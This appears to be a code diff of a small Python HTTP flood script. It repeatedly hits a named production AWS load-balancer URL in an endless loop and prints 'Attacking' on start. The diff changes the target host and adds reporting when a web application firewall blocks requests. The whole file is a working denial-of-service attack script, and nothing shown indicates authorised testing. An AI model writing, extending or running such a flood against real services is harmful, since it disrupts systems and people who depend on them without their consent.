@@ -1,13 +1,17 @@
 import concurrent.futures
 import urllib.request
+import urllib.error
 
-URL = "http://prodpai-alb-684626271.us-east-1.elb.amazonaws.com/"
+URL = "http://prod-pai-env-lb-1228542498.us-east-1.elb.amazonaws.com/"
 
 def spam():
     while True: 
         try:
-            urllib.request.urlopen(URL, timeout=2)
-        except:
+            res = urllib.request.urlopen(URL, timeout=2)
+            # print(f"Success: {res.getcode()}") # ปิดไว้จะได้ไม่รก
+        except urllib.error.HTTPError as e:
+            print(f"Blocked by WAF! Status: {e.code}")
+        except Exception:
             pass
 
 print(f"Attacking {URL} ... Press Ctrl+C to stop.")
